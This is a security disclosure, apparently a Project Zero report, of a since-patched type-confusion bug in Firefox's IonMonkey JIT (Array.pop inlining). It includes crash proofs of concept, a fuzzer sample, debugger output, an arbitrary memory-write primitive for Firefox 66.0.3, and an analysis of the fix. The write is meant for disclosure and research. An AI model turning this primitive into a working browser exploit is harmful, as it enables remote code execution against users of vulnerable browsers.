@@ -1,0 +1,157 @@
+The following program (found through fuzzing and manually modified) crashes Spidermonkey built from the current beta channel and Firefox 66.0.3 (current stable):
+
+    // Run with --no-threads for increased reliability
+    const v4 = [{a: 0}, {a: 1}, {a: 2}, {a: 3}, {a: 4}];
+    function v7(v8,v9) {
+        if (v4.length == 0) {
+            v4[3] = {a: 5};
+        }
+
+        // pop the last value. IonMonkey will, based on inferred types, conclude that the result
+        // will always be an object, which is untrue when  p[0] is fetched here.
+        const v11 = v4.pop();
+
+        // Then if will crash here when dereferencing a controlled double value as pointer.
+        v11.a;
+
+        // Force JIT compilation.
+        for (let v15 = 0; v15 < 10000; v15++) {}
+    }
+
+    var p = {};
+    p.__proto__ = [{a: 0}, {a: 1}, {a: 2}];
+    p[0] = -1.8629373288622089e-06;
+    v4.__proto__ = p;
+
+    for (let v31 = 0; v31 < 1000; v31++) {
+        v7();
+    }
+
+When run, it produces a crash similar to the following:
+
+    * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
+        frame #0: 0x000025a3b99b26cb
+    ->  0x25a3b99b26cb: cmp    qword ptr [rax], r11
+        0x25a3b99b26ce: jne    0x25a3b99b26dd
+        0x25a3b99b26d4: cmovne rax, rcx
+        0x25a3b99b26d8: jmp    0x25a3b99b26f4
+    Target 0: (js) stopped.
+    (lldb) reg read rax
+         rax = 0x4141414141414141
+
+I haven't thoroughly analyzed bug, but here is roughly what appears to be happening:
+
+* when v4 is created, it will have inferred types for its elements, indicating that they will be JSObjects (this can be seen by running the spidermonkey shell with `INFERFLAGS=full` in the environment)
+* in the block following the function definition, v4's prototype is changed to a new object with a double as element 0. This does not change the inferred element types of v4, presumably because these only track own properties/elements and not from prototypes
+* v7 is executed a few times and all original elements from v4 are popped
+* the element assignment (`v4[3] = ...`) changes the length of the array (to 4) without changing the inferred element types
+
+Afterwards, v7 is (re-)compiled by IonMonkey:
+* the call to v4.pop() is inlined by IonMonkey and converted to an MArrayPopShift instruction [1]
+* since the inferred element types (JSObjects) match the observed types, no type barrier is emitted [2, 3]
+* IonMonkey now assumes that the result of v4.pop() will be an object, thus omits type checks and directly proceed with the property load
+* Later, when generating machine code for v4.pop [4], IonMonkey generates a call to the runtime function ArrayPopDense [5]
+
+At execution time of the JITed code, when v4.length is back at 1 (and so the only element left to pop is element 0), the following happens:
+* The runtime call to ArrayPopDense is taken
+* this calls js::array_pop which in turn proceeds to load p[0] as v4 doesn't have a property with name '0'
+* the array pop operation thus returns a double value
+
+However, the JITed code still assumes that it received a JSObject* from the array pop operation and goes on to dereference the value, leading to a crash at an attacker controlled address. It is likely possible to exploit this bug further as type inference issues are generally well exploitable.
+
+To summarize, the problem seems to be that the code handling Array.pop in IonMonkey doesn't take into account that Array.prototype.pop can load an element from the prototype, which could conflict with the array's inferred element types.
+
+
+Bugzilla entry: https://bugzilla.mozilla.org/show_bug.cgi?id=1544386
+
+
+Below is the original sample triggered by my fuzzer:
+
+    // Run with -no-threads --cpu-count=1 --ion-offthread-compile=off --baseline-warmup-threshold=10 --ion-warmup-threshold=100
+    let v2 = 0;
+    v2 = 7;
+    const v4 = [13.37,13.37,13.37,13.37,13.37];
+    function v7(v8,v9) {
+        const v10 = v2 + v4;
+        v4[v10] = Object;
+        const v11 = v4.pop();
+        for (let v15 = 0; v15 < 100; v15++) {
+        }
+    }
+    v4.__proto__ = Object;
+    for (let v19 = 0; v19 < 100; v19++) {
+        const v23 = [-1000000000000.0,-1000000000000.0,-1000000000000.0];
+        let v24 = Object;
+        v24.__proto__ = v23;
+        const v26 = String.fromCharCode(v19);
+        Object[0] = v26;
+    }
+    for (let v31 = 0; v31 < 100; v31++) {
+        const v32 = v7();
+    }
+
+
+This bug can be exploited in a very similar way to https://bugs.chromium.org/p/project-zero/issues/detail?id=1791 and https://bugs.chromium.org/p/project-zero/issues/detail?id=1810 as they all allow the construction of type confusions between arbitrary objects. The following modification of the PoC achieves fast and reliable memory writes to arbitrary addresses in FireFox 66.0.3:
+
+    // Run with --no-threads for increased reliability
+    let ab = new ArrayBuffer(0x1000);
+
+    // Confuse these two types with each other below.
+    let x = {buffer: ab, length: 13.39, byteOffset: 13.40, data: 3.54484805889626e-310};
+    let y = new Uint32Array(0x1000);
+
+    const v4 = [y, y, y, y, y];
+    function v7(v8,v9) {
+        if (v4.length == 0) {
+            v4[3] = y;
+        }
+
+        // pop the last value. IonMonkey will, based on inferred types, conclude that the result
+        // will always be an object, which is untrue when p[0] is fetched here.
+        const v11 = v4.pop();
+
+        // It will then crash here when writing to a controlled address (0x414141414141).
+        v11[0] = 0x1337;
+
+        // Force JIT compilation.
+        for (let v15 = 0; v15 < 10000; v15++) {}
+    }
+
+    var p = {};
+    p.__proto__ = [y, y, y];
+    p[0] = x;
+    v4.__proto__ = p;
+
+    for (let v31 = 0; v31 < 1000; v31++) {
+        v7();
+    }
+
+
+    /* Crashes as follows in Firefox 66.0.3:
+
+    (lldb) process attach --pid 12534
+    ...
+
+    Executable module set to "/Applications/Firefox.app/Contents/MacOS/plugin-container.app/Contents/MacOS/plugin-container".
+    (lldb) c
+    Process 12534 resuming
+    Process 12534 stopped
+    * thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x414141414141)
+        frame #0: 0x000037f56ae479bd
+    ->  0x37f56ae479bd: mov    dword ptr [rcx + 4*rax], 0x1337
+    Target 0: (plugin-container) stopped.
+    (lldb) reg read rcx rax
+         rcx = 0x0000414141414141
+         rax = 0x0000000000000000
+    */
+
+
+The issue was fixed with commit https://hg.mozilla.org/releases/mozilla-beta/rev/109cefe117fbdd1764097e06796960082f4fee4e and released as an out-of-band security update on Jun 18th: https://www.mozilla.org/en-US/security/advisories/mfsa2019-18/
+
+
+I looks like the core issue here was that IonMonkey, when trying to inline calls to Array.push and Array.pop into e.g. the MArrayPopShift instruction, didn't correctly verify that those operations would not end up accessing the prototype. It e.g. checked that no indexed properties (elements) exist on Array.prototype but this check could be bypassed by introducing an intermediate prototype such that the prototype chain looks something like array -> custom prototype with elements -> Array.prototype -> Object.prototype -> null. This is then problematic for at least two reasons:
+
+* There could be inferred element types for the array. IonMonkey then assumed that the inlined pop would always yield an object of the inferred type which wasn't true if the pop actually loaded an element from the prototype. This is the aspect that Fuzzilli triggered
+* By installing indexed getters and/or setter on the prototype, it becomes possible to turn this bug into an unexpected side-effect issue as the inlined push and pop operations are not supposed to trigger any side-effects
+
+The fix was then to avoid inlining push and pop if the access could potentially go to the prototype.
